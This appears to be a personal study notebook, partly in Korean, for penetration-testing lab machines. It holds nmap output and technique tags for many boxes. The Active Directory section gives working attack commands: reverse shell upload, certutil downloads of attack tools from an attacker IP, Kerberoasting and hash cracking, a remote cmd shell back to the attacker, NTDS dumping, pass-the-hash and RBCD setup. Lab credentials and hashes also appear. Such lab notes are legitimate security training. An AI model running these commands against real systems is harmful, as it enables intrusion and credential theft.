|_ 256 08:95:d6:60:52:17:3d:03:e4:7d:90:fd:b2:ed:44:86 (ED25519)  
80/tcp open http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)  
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16  
| http-methods:  
|_ Potentially risky methods: TRACE  
|_http-title: Apache HTTP Server Test Page powered by CentOS  
111/tcp open rpcbind 2-4 (RPC #100000)  
| rpcinfo:  
| program version port/proto service  
| 100000 2,3,4 111/tcp rpcbind  
| 100000 2,3,4 111/udp rpcbind  
| 100000 3,4 111/tcp6 rpcbind  
|_ 100000 3,4 111/udp6 rpcbind  
139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)  
445/tcp open netbios-ssn Samba smbd 4.10.4 (workgroup: SAMBA)  
3306/tcp open mysql MariaDB (unauthorized)  
8081/tcp open http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)  
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16  
|_http-title: 400 Bad Request  
Service Info: Host: QUACKERJACK; OS: Unix  
  
Host script results:  
| smb-security-mode:  
| account_used: guest  
| authentication_level: user  
| challenge_response: supported  
|_ message_signing: disabled (dangerous, but default)  
| smb2-time:  
| date: 2024-01-18T19:54:27  
|_ start_date: N/A  
| smb-os-discovery:  
| OS: Windows 6.1 (Samba 4.10.4)  
| Computer name: quackerjack  
| NetBIOS computer name: QUACKERJACK\x00  
| Domain name: \x00  
| FQDN: quackerjack  
|_ System time: 2024-01-18T14:54:29-05:00  
|_clock-skew: mean: 1h39m59s, deviation: 2h53m15s, median: -2s  
| smb2-security-mode:  
| 3:1:1:  
|_ Message signing enabled but not required
```

### Wombo - Redis
```shell
nmap -p22,80,8080,6379,27017 -sV -A 192.168.153.69
```

### Flu - atlassian - cronjob
```shell
22, 8090 and 8091
```

### Roquefort - gitea - envPATHAbuse
```shell
# nc / curl 없음
ssh-keygen으로 해결

```

### Levram - Gerapy

### Mzeeav - Mzee-av - Upload MIME bypass - findutils
```shell
└─$ sudo nmap -Pn -n $IP -sC -sV -p- --open  
[sudo] password for kali:  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-29 09:21 EST  
Nmap scan report for 192.168.194.33  
Host is up (0.090s latency).  
Not shown: 63421 closed tcp ports (reset), 2112 filtered tcp ports (no-response)  
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit  
PORT STATE SERVICE VERSION  
22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)  
| ssh-hostkey:  
| 3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)  
| 256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)  
|_ 256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)  
80/tcp open http Apache httpd 2.4.56 ((Debian))  
|_http-title: MZEE-AV - Check your files  
|_http-server-header: Apache/2.4.56 (Debian)  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### LaVita - laravel - user process
```shell
Port 22 and 80 opened.
```

### Xposedapi - WAFBypass - LFI - Command Injection
```shell
22, 13337

WAF bypass
```

### Zipper - zip://, rar:// - 7zip wildcard
```shell
$ nmap -sC -sV -A 192.168.226.229 -p22,80  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-04 20:36 EDT  
Nmap scan report for 192.168.226.229  
Host is up (0.014s latency).  
  
PORT STATE SERVICE VERSION  
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:  
| 3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)  
| 256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)  
|_ 256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)  
80/tcp open http Apache httpd 2.4.41 ((Ubuntu))  
|_http-server-header: Apache/2.4.41 (Ubuntu)  
|_http-title: Zipper  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 7.29 seconds

rot13 디코더
```

### Workaholic - WP-Advanced-Search plugin

### Fired - Openfire

### Scrutiny - TeamCity - sshcrack - smtp

### SPX - H3K - Make

### Vmdak - Prison Management - Jenkins
```shell
21, 22, 80, 9443
```

### BitForge - Simple Online Planning - git show - writable
```shell
22, 80, 3306, 9000
```

### WallpaperHub - bash_history - happy-dom

### Zab - Tornado - Zabbix
```shell
22(SSH), 80(HTTP) 및 6789(HTTP)
```

### SpiderSociety - ftp - .service
```shell
22, 80, 2121
```


## Windows
### Kevin

### Internal

### Algernon

### Jacko

### Craft

### Squid

### Nickel

### MedJed

### Billyboss

### Shenzi

### AuthBy

### Slort

### Hepet

### DVR4

### Mice

### Monster

### Fish


## AD
### Access - .htaccess - php - SPN roasting -SeManageVolumePrivilege 

```shell
sudo nmap -sC -sV -Pn -p- 192.168.124.187 -oN 124.187_allport

# web
whatweb http://192.168.124.187    
http://192.168.124.187 [200 OK] Apache[2.4.48], Bootstrap, Country[RESERVED][ZZ], Email[info@example.com], Frame, HTML5, HTTPServer[Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7], IP[192.168.124.187], Lightbox, OpenSSL[1.1.1k], PHP[8.0.7], Script, Title[Access The Event]

feroxbuster -u http://192.168.124.187 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -C 400
301      GET        9l       30w      344c http://192.168.124.187/uploads => http://192.168.124.187/uploads/

# .htaccess로 확장자 허용 변경 후 php reverse shell을 .dork 확장자로 업로드
echo "AddType application/x-httpd-php .dork" > .htaccess
# https://www.revshells.com/
php Ivan Sincek

# privil
cd C:\Users\Public
certutil -urlcache -split -f http://192.168.45.192/Get-SPN.ps1
./Get-SPN.ps1
Object Name =  krbtgt
DN      =       CN=krbtgt,CN=Users,DC=access,DC=offsec
Object Cat. =  CN=Person,CN=Schema,CN=Configuration,DC=access,DC=offsec
servicePrincipalNames
SPN( 1 )   =       kadmin/changepw

Object Name =  MSSQL
DN      =       CN=MSSQL,CN=Users,DC=access,DC=offsec
Object Cat. =  CN=Person,CN=Schema,CN=Configuration,DC=access,DC=offsec
servicePrincipalNames
SPN( 1 )   =       MSSQLSvc/DC.access.offsec

# roasting
certutil -urlcache -split -f http://192.168.45.192/Rubeus.exe
.\Rubeus.exe kerberoast /outfile:kerberoast.hashes

# Ctrl + D
download ./kerberoast.hashes

# crack - trustno1
john kerberoast.hashes --wordlist=/usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt

# 
certutil -urlcache -split -f http://192.168.45.192/Invoke-RunasCs.ps1
import-module .\Invoke-RunasCs.ps1
Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "cmd.exe" -Remote 192.168.45.192:443

# https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public
```

### Resourced - SMB - ntds.dit + SYSTEM File - DCSync - rbcd attack
```shell
sudo nmap -sC -sV -Pn -p- 192.168.124.175 -oN 124.175_allport
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-16 11:46:28Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-12-16T11:47:59+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=ResourceDC.resourced.local
| Not valid before: 2025-12-15T11:41:44
|_Not valid after:  2026-06-16T11:41:44
| rdp-ntlm-info: 
|   Target_Name: resourced
|   NetBIOS_Domain_Name: resourced
|   NetBIOS_Computer_Name: RESOURCEDC
|   DNS_Domain_Name: resourced.local
|   DNS_Computer_Name: ResourceDC.resourced.local
|   DNS_Tree_Name: resourced.local
|   Product_Version: 10.0.17763
|_  System_Time: 2025-12-16T11:47:20+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49708/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: RESOURCEDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-12-16T11:47:20
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

# smb
crackmapexec smb 192.168.124.175 -u '' -p '' --users
SMB         192.168.124.175 445    RESOURCEDC       resourced.local\V.Ventz                        New-hired, reminder: HotelCalifornia194!

# resourced.local\V.Ventz : HotelCalifornia194!
crackmapexec smb 192.168.124.175 -u 'V.Ventz' -p 'HotelCalifornia194!' --shares
crackmapexec smb 192.168.124.175 -u 'V.Ventz' -p 'HotelCalifornia194!' --spider 'Password Audit' --regex .
smbclient //192.168.124.175/Password\ Audit -U 'resourced.local\V.Ventz'
cd registry
get SYSTEM

# SYSTEM CRACK 
impacket-secretsdump - ntds ntds.dit - system SYSTEM LOCAL

crackmapexec winrm 192.168.124.175 -u users -H hashesh
evil-winrm -i 192.168.124.175 -u L.Livingstone -H '19a3a7550ce8c505c2d46b5e39d6f808'
impacket-psexec L.Livingstone@192.168.124.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808

# SharpHOund
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\L.Livingstone\Desktop -OutputPrefix test

# DCSync 아래 실패
lsadump::dcsync /domain:resourced.local /user:test

impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.124.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'

```

### Nagoya - password guess - smb - exe reversing - GetUserSPNs : gethash - crack - CanPSRemote - PortForward - MSsql - 
```shell
user명 얻기 -> as-rep roasting

strings -e l ~.exe

```

### Hokkaido

### Hutch

### Vault - SMB upload - responder - SeRestorePrivilege/Powerview
```shell


```










